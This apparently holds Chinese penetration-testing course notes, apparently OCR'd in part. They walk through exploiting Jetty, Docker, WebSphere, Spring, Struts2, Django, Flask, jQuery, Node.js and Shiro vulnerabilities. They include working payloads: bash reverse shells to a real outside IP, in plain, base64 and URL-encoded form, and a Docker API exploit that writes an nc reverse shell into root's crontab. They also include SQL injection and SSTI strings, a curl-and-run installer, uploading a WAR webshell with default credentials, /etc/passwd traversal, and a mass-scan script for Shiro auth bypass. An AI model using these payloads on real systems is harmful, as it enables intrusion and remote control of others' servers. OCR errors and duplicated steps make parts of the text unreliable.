+<p>中间件-K8s-搜哈<br>kubernetest简称k8s,是一个由google开源的，用于自动部暑，扩展和管理容器化应用程序的开源系统。在B站内部，k8s在管理生产级容器和应用服务部署已经有较为广泛和成熟的应用。通过kK8$,可跨多台主机进行容器编排、快速按需扩展容器应用及其资源、对应<br>用实施状况检查、服务发现和负载均衡街等。<br><a href="https://blog.csdn.net/w1590191166/article/details/122028001">https://blog.csdn.net/w1590191166/article/details/122028001</a></p>
+<p>中间件Jetty-搜哈<br>Elipse Jetty是一个开源的servlet容器，它为基于Java的Web容器提供运行环境。<br>CVE-2021-28164<br><a href="http://123.58.236.76.63126/WEB-INF/web.Xxml">http://123.58.236.76.63126/%2e/WEB-INF/web.Xxml</a><br>CVE-2021-28169<br><a href="http://123.58.236.76:63126/static?/WEB-INF/web.xml">http://123.58.236.76:63126/static?/WEB-INF/web.xml</a><br>CVE-2021-34429<br>http:&#x2F;123.58.236.76:63126&#x2F;%u002eWEB-NF&#x2F;web.xml</p>
+<p>中间件-Docker-搜哈<br>Docker容器是使用沙盒机制，是单独的系统，理论上是很安全的，通过利用某种手段，再结合执行POC或EXP,就可以返回一个宿主机的高权限Shll,并拿到宿主机的root权限，可以直接操作宿主机文件。它从容器中逃了出来，因此我们形象的称为Dockeri逃逸漏洞。<br>1、容器判断：判断当前是否是容器环境<br>-是否存在.dockerenv文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Is -alh /.dockerenv</span><br></pre></td></tr></table></figure>
+
+<p>查间系统进程的cgroup信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
+
+<p>2、容器逃逸漏洞：权限提升<br>-由两核漏洞引起一DirtyC0W(CVE-2016-5195)<br>-由Docker软件设计引起CVE-2019-5736、CVE-2019-14271,CVE-2020-15257<br>由配置不当引起一开启privileged（特权模式）+宿主机目录挂载（文件挂载）、功能<br>(capabilities)机制、sock通信方式<br>CVE-2016-5195<br><a href="https://github.com/gebl/dirtycow-docker-vdso">https://github.com/gebl/dirtycow-docker-vdso</a><br><a href="https://www.ichunqiu.com/experiment/catalog?id=100295">https://www.ichunqiu.com/experiment/catalog?id=100295</a><br>第一步、启动容器：<br>#使用本地1234端口连接docker的1234端口运行dirtycow镜像，并将其临时命名为test<br>#其中test:为临时名称，可以自定义填写。p:第一个端口为本机的端口，第二个端口<br>为Docker的端口。-td:意思是在后台运行，交互式运行，并且输出当前的信息<br>bin&#x2F;bash:调用Shel</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --name=test-p 1234:1234 -itd dirtycow /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>第二部、进入容器：<br>#进入镜像内部</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec-it test /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>第三步、<br>#编译并运行POC</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /dirtycow-vdso/</span><br><span class="line">make</span><br><span class="line">/0xdeadbeef</span><br></pre></td></tr></table></figure>
+
+<p>执行操作即可作用宿主机</p>
+<p>-CVE-2019-5736<br>参考：https:&#x2F;&#x2F;&#x2F;blog.51cto.com&#x2F;u_15060465&#x2F;4336524<br>复现：curl<br><a href="https://aist_githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw">https://aist_githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw</a> -o<br>install.sh &amp;bash install.sh<br>1、下载POC</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/Frichetten/CVE-2019-5736-PoC</span><br></pre></td></tr></table></figure>
+
+<p>2、修改编译生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>
+
+<p>2、修改编译生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CGO ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure>
+
+
+<p>3.将该payload拷贝到docker容器中（此时可以模拟攻击者获取了docker容器权限，在容器<br>中上传payload进行dockeri逃逸）并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp main ecca872da49d:/home</span><br><span class="line">docker exec-it ecca872da49d bash</span><br><span class="line">cd /home/</span><br><span class="line">chmod 777 main</span><br><span class="line">/main</span><br></pre></td></tr></table></figure>
+
+<p>4、再次进入docker镜像后监听即可收到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec-t镜像ID bash</span><br><span class="line">nc -lwvp</span><br></pre></td></tr></table></figure>
+
+<p>3、容器安全漏洞<br>docker未授权访问漏洞-vulhub-exp.py</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import docker</span><br><span class="line">client docker.DockerClient(base_url=&#x27;http://IP:2375/)</span><br><span class="line">data=client.containers.run(alpine:latest&#x27;,r&quot;sh-c&quot;echousr/bin/nc反弹IP端☐-e</span><br><span class="line">bin/sh&#x27;&gt;&gt;/tmp/etc/crontabs/root&quot;&quot;,remove=True,volumes=f/etc&quot;:(bind&#x27;:&#x27;/tmp/etc&#x27;,</span><br><span class="line">&#x27;mode&#x27;:&#x27;nw)))</span><br></pre></td></tr></table></figure>
+
+<p>中间件-WebSphere-搜哈<br>WebSphere@Application Server加速交付新应用程序和服务，它可以通过快速交付创新<br>的应用程序来帮助企业提供丰富的用户体验从基于开放标准的丰富的编程模型中进行选<br>择，以便更好地协调项目需求与编程模型功能和开发人员技能。<br>端口：9080一web(http)应用访问端口、9443-web(https)应用访i问端口、9060一管理后台<br>访问端口、9043一管理控制台安全端口、8880一SOAP连接器端口等等。<br>漏洞探测在8880满口，后台是9060端口，解析是9080端口<br>拉取镜像：docker pull iscrosales&#x2F;websphere7<br>启动镜像：docker run-d-p9060:9060-p9043:9043-p8880:8880-p9080:9080<br>iscrosales&#x2F;websphere7<br>停止镜像：docker stop $(docker ps-aq)<br>1、CVE-2015-7450反序列化<br>工具搜哈：<a href="http://147.94.236.117:8880/">http://147.94.236.117:8880/</a><br>2、弱☐令上传拿Shell<br>-在6x至7.0版本，后台登陆只需要输入admin作为用户标识，无需密码，即可登陆后台。<br>-websphere&#x2F;websphere<br>-system&#x2F;manager<br>访i问：http:147.94.236.117:9060&#x2F;<br>登录：admin<br>上传：war马<br>启动：1_war<br>连接：<a href="http://47.94.236.117:9080/1/1jsp">http://47.94.236.117:9080/1/1jsp</a><br>3、CVE-2020-4450:无利用P0C&#x2F;EXP</p>
+<h1 id="第62天-服务攻防-框架安全-CVE复现-Spring-Struts-Laravela-ThinkPHP"><a href="#第62天-服务攻防-框架安全-CVE复现-Spring-Struts-Laravela-ThinkPHP" class="headerlink" title="第62天 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravela&amp;ThinkPHP"></a>第62天 服务攻防-框架安全&amp;CVE复现&amp;Spring&amp;Struts&amp;Laravela&amp;ThinkPHP</h1><h4 id="知识点：-42"><a href="#知识点：-42" class="headerlink" title="知识点："></a>知识点：</h4><p>中间件及框架列表：<br>IIS,Apache,Nginx,Tomcat,Docker,K8s,Weblogic.JBoos,WebSphere,<br>Jenkins,GlassFish,Jetty,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Spring,<br>Flask,jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3.开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery</p>
+<h4 id="常见语言开发框架："><a href="#常见语言开发框架：" class="headerlink" title="常见语言开发框架："></a>常见语言开发框架：</h4><p>PHP:Thinkphp Laravel YIl Codelgniter CakePHP Zend<br>JAVA:Spring MyBatis Hibernate Struts2 Springboot<br>Python:Django Flask Bottle Turbobars Tornado Web2py<br>Javascript:Vue.js Node.js Bootstrap JQuery Angular</p>
+<h4 id="章节内容：-8"><a href="#章节内容：-8" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
+<h4 id="前置知识：-11"><a href="#前置知识：-11" class="headerlink" title="前置知识："></a>前置知识：</h4><p>,中间件安全测试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
+<p>应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
+<p>开发框架组件安全测试流程：<br>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
+<h4 id="演示案例：-36"><a href="#演示案例：-36" class="headerlink" title="演示案例："></a>演示案例：</h4><p>PHP-开发框架安全-Thinkphp&amp;Laravel<br>JAVAWEB-开发框架安全-Spring&amp;Struts2</p>
+<h5 id="PHP-开发框架安全-Thinkphp-Laravel"><a href="#PHP-开发框架安全-Thinkphp-Laravel" class="headerlink" title="PHP-开发框架安全-Thinkphp&amp;Laravel"></a>PHP-开发框架安全-Thinkphp&amp;Laravel</h5><p>-Laravel是一套简洁、优雅的PHP Web开发框架PHP Web Framework).<br>CVE-2021-3129RCE<br>Laravel &lt;8.4.2<br><a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a><br><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a><br>漏洞复现：<br>使用exp一步Thinkphp-3.X RCE-5.X RCE 脚本小子上线<br>ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架<br>武器库-Thinkphp专检写入shell，使用哥斯拉连接</p>
+<h5 id="JAVAWEB-开发框架安全-Spring-Struts2"><a href="#JAVAWEB-开发框架安全-Spring-Struts2" class="headerlink" title="JAVAWEB-开发框架安全-Spring&amp;Struts2"></a>JAVAWEB-开发框架安全-Spring&amp;Struts2</h5><p>Struts:2是一个基于MvC设计模式的Web应用框架</p>
+<h6 id="1、2020前漏洞-复现"><a href="#1、2020前漏洞-复现" class="headerlink" title="1、2020前漏洞 复现"></a>1、2020前漏洞 复现</h6><p>武器库-S2专检</p>
+<h6 id="2、cve-2020-17530-复现"><a href="#2、cve-2020-17530-复现" class="headerlink" title="2、cve_2020_17530 复现"></a>2、cve_2020_17530 复现</h6><p>脚本：<a href="https://github.com/YanMu.2020/s2-062">https://github.com/YanMu.2020/s2-062</a><br>手工：</p>
+<h6 id="3、cve2021-31805"><a href="#3、cve2021-31805" class="headerlink" title="3、cve2021_31805"></a>3、cve2021_31805</h6><p><a href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p>
+<h5 id="Spring框架是由于软件开发始的复杂性而创建的。"><a href="#Spring框架是由于软件开发始的复杂性而创建的。" class="headerlink" title="Spring框架是由于软件开发始的复杂性而创建的。"></a>Spring框架是由于软件开发始的复杂性而创建的。</h5><h6 id="1-cve-2017-4971-Spring-Web-Flow-vulfocus"><a href="#1-cve-2017-4971-Spring-Web-Flow-vulfocus" class="headerlink" title="1,cve_2017_4971-Spring Web Flow vulfocus"></a>1,cve_2017_4971-Spring Web Flow vulfocus</h6><p>Spring WebFlow 2.4.0-2.4.4<br><a href="https://paper.seebug.org/322/">https://paper.seebug.org/322/</a><br>_eventld_confirm&#x3D;&amp;csrf&#x3D;e06e1d86-e083-45f7-<br>b700-567b5f7f5d30&amp;(new+java.lang.ProcessBuilder(“bash”,“-c”,”bash±<br>i+&gt;%26+&#x2F;dev&#x2F;tcp&#x2F;47.94.236.117&#x2F;5566+0&gt;%261).stat0&#x3D;vulhub</p>
+<h6 id="2-cve-2018-1273-Spring-Data-Commons-vulfocus"><a href="#2-cve-2018-1273-Spring-Data-Commons-vulfocus" class="headerlink" title="2.cve_2018_1273-Spring Data Commons vulfocus"></a>2.cve_2018_1273-Spring Data Commons vulfocus</h6><p>Spring Data Commons 1.13-1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6-2.6.10(Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5<br>Spring Data REST 3.0-3.0.5(Kay SR5）<br>bash-c<br>fecho.YmFzaCAtaSA+JiAvZGV2L3RicC80Ny45NC4yMzYuMTE3LZU1NjYgMD4mMQ&#x3D;&#x3D;<br>base64,-d bash,-i)<br>username#this getclass（）.forName(“java lang.Runtime”).getRuntime(.exec(“%62%61%<br>73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74<br>%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%3<br>0%4e%79%34%35%4e%43%34%79%4d%7a%59%75%4d%54%45%33%4c%7a%55%<br>31%4e%6a%59%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65<br>%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d”]&#x3D;&amp;passw0rd&#x3D;&amp;<br>repeatedPassword&#x3D;</p>
+<h6 id="3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入-vulhub"><a href="#3、CVE-2022-22963-Spring-Cloud-Function-Spel表达式注入-vulhub" class="headerlink" title="3、CVE-2022-22963 Spring Cloud Function Spel表达式注入 vulhub"></a>3、CVE-2022-22963 Spring Cloud Function Spel表达式注入 vulhub</h6><p>Spring Cloud Function提供了一个通用的模型，用于在冬种平台上部署基于函数的软件，<br>包括像Amazon AWS Lambda这样的FaaS(函数即服务，function as a service)平台。<br>Connection:close<br>spring cloud.function.routing-expression:T(java.lang.Runtime).getRuntime(.exec(“bash-<br>(echo,YmFzaCAtaSA+JiAVZGV2L3RjcC80Ny45NC4yMzYuMTE3LZU1NjYgMD4mMQ&#x3D;&#x3D;)<br>Kbase64.-d)(bash,-i)”)</p>
+<h1 id="第六十三天-服务攻防-框架安全-CVE复现-Django-Flask-Node-JS-JQuery"><a href="#第六十三天-服务攻防-框架安全-CVE复现-Django-Flask-Node-JS-JQuery" class="headerlink" title="第六十三天 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery"></a>第六十三天 服务攻防-框架安全&amp;CVE复现&amp;Django&amp;Flask&amp;Node.JS&amp;JQuery</h1><h4 id="中间件及框架列表："><a href="#中间件及框架列表：" class="headerlink" title="中间件及框架列表："></a>中间件及框架列表：</h4><p>IIS,Apache,Nginx,Tomcat,Docker,K8s,Weblogic.JBoos,WebSphere,<br>Jenkins,GlassFish,Jetty,Jira,Struts2,Laravel,Solr,Shiro,Thinkphp,Spring,<br>Flask,jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3.开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery<br>5、其他框架Java-Apache Shiro&amp;Apache Sorl</p>
+<h4 id="常见语言开发框架：-1"><a href="#常见语言开发框架：-1" class="headerlink" title="常见语言开发框架："></a>常见语言开发框架：</h4><p>PHP:Thinkphp Laravel YIl Codelgniter CakePHP Zend<br>JAVA:Spring MyBatis Hibernate Struts2 Springboot<br>Python:Django Flask Bottle Turbobars Tornado Web2py<br>Javascript:Vue.js Node.js Bootstrap JQuery Angular</p>
+<h4 id="章节内容：-9"><a href="#章节内容：-9" class="headerlink" title="章节内容："></a>章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
+<h4 id="前置知识：-12"><a href="#前置知识：-12" class="headerlink" title="前置知识："></a>前置知识：</h4><p>中间件安全测试流程：<br>1、判断中间件信息名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
+<h5 id="应用服务安全测试流程：见图"><a href="#应用服务安全测试流程：见图" class="headerlink" title="应用服务安全测试流程：见图"></a>应用服务安全测试流程：见图</h5><p>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
+<h5 id="开发框架组件安全测试流程："><a href="#开发框架组件安全测试流程：" class="headerlink" title="开发框架组件安全测试流程："></a>开发框架组件安全测试流程：</h5><p>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
+<h4 id="演示案例：-37"><a href="#演示案例：-37" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Python-开发框架安全-Django&amp;Flask<br>JavaScript-开发框架安全-Jquery&amp;Node</p>
+<p>Python-开发框架安全-Diango&amp;Fask</p>
+<h5 id="Django"><a href="#Django" class="headerlink" title="Django"></a>Django</h5><p>Django是一款广为流行的开源web框架，由Python编写，许多网站和app都基于Django开<br>发。Django采用了MTV的框架模式，即模型M,视图V和模版T,使用Django,程序员可以<br>方便、快捷地创建高品质、易维护、数据库驱动的应用程序。而且Django还包含许多功能<br>强大的第三方插件，使得Django.具有较强的可扩展性。<br>1、Cve_201914234 需要登录到后台<br>访问下面的路径，单引号已注入成功，SQL语句报错：<br>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail_a%27b&#x3D;123<br>创建cmd exec:<br>admin&#x2F;vuln&#x2F;collection&#x2F;?detail title%27)%3d%271%27%200r%201%3d1%20%3bcreate<br>%20table%20cmd_exec(cmd_output%20text)-%20<br>调用cmd_exec执行命令：<br>&#x2F;admin&#x2F;vuln&#x2F;collection&#x2F;?detail title%27)%3d%271%27%20or%201%3d1%20%3bcopy%<br>20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz dnslog.cn%27–%20<br>2、CVE-2021-35042 vulfocus<br>&#x2F;vuln&#x2F;?order&#x3D;vuln collection name)select%20updatexml(1,%20concat(0x7e,<br>select%20@@basedir)),1)%23<br>&#x2F;vuln&#x2F;?order&#x3D;vuln collection.name)select%20updatexml(1.%20concat(Ox7e,<br>(select%20version（）)).1)%23<br>数i据库名：vuln&#x2F;?order-vuln collection.name)select%20 updatexml1,%20 concat(0x7e,<br>select%20database（）).1)%23<br>3、CVe-2022-28346<br><a href="https://github.com/YouGina/CVE-2022-28346">https://github.com/YouGina/CVE-2022-28346</a></p>
+<h5 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h5><p>Flask是一个使用Pythons编写的轻量级Web应用框架。其WSGl工具箱采用Verkzeug,模<br>板引擎则使用Jinja2 vulhub<br>?name&#x3D;%7B%25%20for%20c%20in%20%5B%5D.class_base_subclasses_<br>()<br>%20%25%7D%0A%7B%25%20if%20c.name %20%3D%3D%20%27catch_warning<br>s%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.init__globals<br>values（）</p>
+<p>JavaScript-开发框架安全-Jquery&amp;Node</p>
+<h5 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h5><p>1、cve_2018_9207cve20189208cve20189209<br>描述jQuery是一个快速、简洁的JavaScript框架，是继Prototype,之后又一个优秀的<br>JavaScript代码库（框架）于2006年1月由John Resig发布。<br>jQuery Upload File&lt;&#x3D;4.0.2中的任意文件上传<br>curl -F “myfile&#x3D;@php.php”“<a href="http://123.58.236.76:56579/jquery-upload-">http://123.58.236.76:56579/jquery-upload-</a><br>file&#x2F;php&#x2F;upload.php”</p>
+<h5 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h5><p>1、Cve202121315 vulfocus<br>Node.js:是一个基于Chrome V8引擎的JavaScripti运行环境，用于方便的培建响应速度快<br>易于拓展的网络应用。<br>Node.js-systeminformation是用于获取各种系统信息的Node.js模块在存在命令注入漏同的<br>版本中，攻击者可以通过未过滤的参数中注入payloadi执行系统命令。<br>Systeminformation&lt;5.3.1<br>git clone <a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC.git</a><br>node index.js<br>&#x2F;api&#x2F;getServices?name&#x3D;$(echo -e ‘xiaodi’&gt;test.txt)<br>2、cve201714849 vulfocus<br>GET:<br>&#x2F;static&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passwd</p>
+<h1 id="第六十四天-服务攻防-框架安全-CVE复现Apache-shiro-Apache-Solr"><a href="#第六十四天-服务攻防-框架安全-CVE复现Apache-shiro-Apache-Solr" class="headerlink" title="第六十四天 服务攻防-框架安全&amp;CVE复现Apache shiro&amp;Apache Solr"></a>第六十四天 服务攻防-框架安全&amp;CVE复现Apache shiro&amp;Apache Solr</h1><h4 id="知识点：-43"><a href="#知识点：-43" class="headerlink" title="#知识点："></a>#知识点：</h4><p>中间件及框架列表：<br>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等<br>1、开发框架-PHP-Laravel-Thinkphp<br>2、开发框架-Javaweb-St2-Spring<br>3、开发框架-Python-django-Flask<br>4、开发框架-Javascript-Node.js-JQuery<br>5、其他框架-Java-Apache Shiro&amp;Apache Sorl</p>
+<p>常见语言开发框架：</p>
+<p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等<br>JAVA：Spring MyBatis Hibernate Struts2 Springboot等<br>Python：Django Flask Bottle Turbobars Tornado Web2py等<br>Javascript：Vue.js Node.js Bootstrap JQuery Angular等</p>
+<h4 id="章节内容：-10"><a href="#章节内容：-10" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>常见中间件的安全测试：<br>1、配置不当-解析&amp;弱口令<br>2、安全机制-特定安全漏洞<br>3、安全机制-弱口令爆破攻击<br>4、安全应用-框架特定安全漏洞</p>
+<h4 id="前置知识：-13"><a href="#前置知识：-13" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>-中间件安全测试流程：<br>1、判断中间件信息-名称&amp;版本&amp;三方<br>2、判断中间件问题-配置不当&amp;公开漏洞<br>3、判断中间件利用-弱口令&amp;EXP&amp;框架漏洞</p>
+<p>-应用服务安全测试流程：见图<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属-数据库&amp;文件传输&amp;通讯等<br>3、判断服务利用方式-特定漏洞&amp;未授权&amp;弱口令等</p>
+<p>-开发框架组件安全测试流程：<br>1、判断常见语言开发框架类型<br>2、判断开发框架存在的CVE问题<br>3、判断开发框架CVE漏洞利用方式</p>
+<ul>
+<li><h4 id="ApacheShiro-组件框架安全"><a href="#ApacheShiro-组件框架安全" class="headerlink" title="ApacheShiro-组件框架安全"></a>ApacheShiro-组件框架安全</h4></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Shiro是一个强大且易用的Java安全框架，用于身份验证、授权、密码和会话管理</span><br><span class="line">判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段，主要用到java中</span><br><span class="line">搜索：header=&quot;remeberMe=deleteMe&quot;</span><br><span class="line">在cookie中带有：Set-Cookie: remeberMe=deleteMe; Path=/; Max-Age=0; Expires=Tue, 26-Apr-2022 22:23:24 GMT</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">漏洞：https://avd.aliyun.com/search?q=shiro</span><br><span class="line">Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞【CVE-2016-4483】</span><br><span class="line">Apache Shiro &lt; 1.3.2 验证绕过漏洞【CVE-2016-2807】</span><br><span class="line">Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 【CVE-2019-12442】</span><br><span class="line">Apache Shiro &lt; 1.5.2 验证绕过漏洞 【CVE-2020-1957】</span><br><span class="line">Apache Shiro &lt; 1.5.3 验证绕过漏洞 【CVE-2020-11989】</span><br><span class="line">Apahce Shiro &lt; 1.6.0 验证绕过漏洞 【CVE-2020-13933】</span><br><span class="line">Apahce Shiro &lt; 1.7.1 权限绕过漏洞 【CVE-2020-17523】</span><br><span class="line">1、CVE_2016_4437 Shiro-550+Shiro-721</span><br><span class="line">环境：https://vulfocus.cn/#/dashboard?image_id=df02a278-761c-483b-913f-9f8142b9a19f</span><br><span class="line"> </span><br><span class="line">在GUI_Tools中也有他检测的漏洞利用。先点击检测当前秘钥，然后爆破秘钥，在接着爆破利用链及回显。回显结果： 发现构造链:CommonsCollections2  回显方式: TomcatEcho然后在选择相对应的。可以执行命令。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、CVE-2020-11989</span><br><span class="line">漏洞下载地址：https://github.com/jweny/shiro-cve-2020-17523</span><br><span class="line">影响范围：Apache Shiro &lt; 1.7.1</span><br><span class="line"> </span><br><span class="line">下载源码，用idea打开，直接启动，默认开放9090端口，访问：http://127.0.0.1:9090/</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认加载的地方：org.test.springbootshiro.SpringbootShiroApplication</span><br><span class="line">点击springbookshiroapplication 然后edit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在\src\main\java\org\test\springbootshiro目录下，有LoginController.java，SpringbootShiroApplication.java两个文件</span><br><span class="line"> </span><br><span class="line">在LoginController.java中，访问/doLogin，尝试输入账号密码，成功提示success，失败提示failed</span><br><span class="line">账号密码配置文件是在MyRealm.java文件中配置：java 123</span><br><span class="line"> </span><br><span class="line">当直接访问http://127.0.0.1:9090/admin/xxx的时候，地址就自动换成http://127.0.0.1:9090/login，显示内容为please login!，就是要登录的意思。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这个漏洞是直接访问：http://127.0.0.1:9090/admin/%20</span><br><span class="line">这样就可以直接登录到后台。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果在白盒的角度分析的话，这个漏洞是怎么产生的。在LoginController.java这个文件中，这个文件引用了一个包：import org.apache.shiro.SecurityUtils;</span><br><span class="line">在pom.xml配置文件中：</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;shiro-web&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;1.7.0&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line"> </span><br><span class="line">引用了这个框架org.apache.shiro，版本是1.7.0符合漏洞版本。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、CVE-2020-1957</span><br><span class="line">影响范围：Apache Shiro &lt; 1.5.3</span><br><span class="line"> </span><br><span class="line">启动环境：</span><br><span class="line">cd /vulhub-master/shiro$ cd CVE-2020-1957</span><br><span class="line">sudo docker-compose up -d</span><br><span class="line"> </span><br><span class="line">访问：http://192.168.233.128:8080/，点击login跳转：http://192.168.233.128:8080/login.html</span><br><span class="line">如果直接访问：http://192.168.233.128:8080/xxx/..;/admin/就相当于直接进入了后台目录</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">也可以在网上写python代码来进行测试：</span><br><span class="line">语法：app=&quot;APACHE-Shiro&quot;</span><br><span class="line"> </span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">for url in open(&#x27;ips.txt&#x27;):</span><br><span class="line">	url=url.strip()</span><br><span class="line">	url=&#x27;http://&#x27;+url+&#x27;/;/login&#x27;</span><br><span class="line">	try:</span><br><span class="line">		code=requests.get(url).status_code</span><br><span class="line">		print(code)</span><br><span class="line">		if code==200:</span><br><span class="line">			print(url+&#x27;|ok&#x27;)</span><br><span class="line">	except Exception as e:</span><br><span class="line">		pass</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">附加：shiro是很有名的漏洞点，特别是在面试中，基本上都会问到这个知识点。</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="ApacheSolr-组件框架安全"><a href="#ApacheSolr-组件框架安全" class="headerlink" title="ApacheSolr-组件框架安全"></a>ApacheSolr-组件框架安全</h4></li>
+</ul>
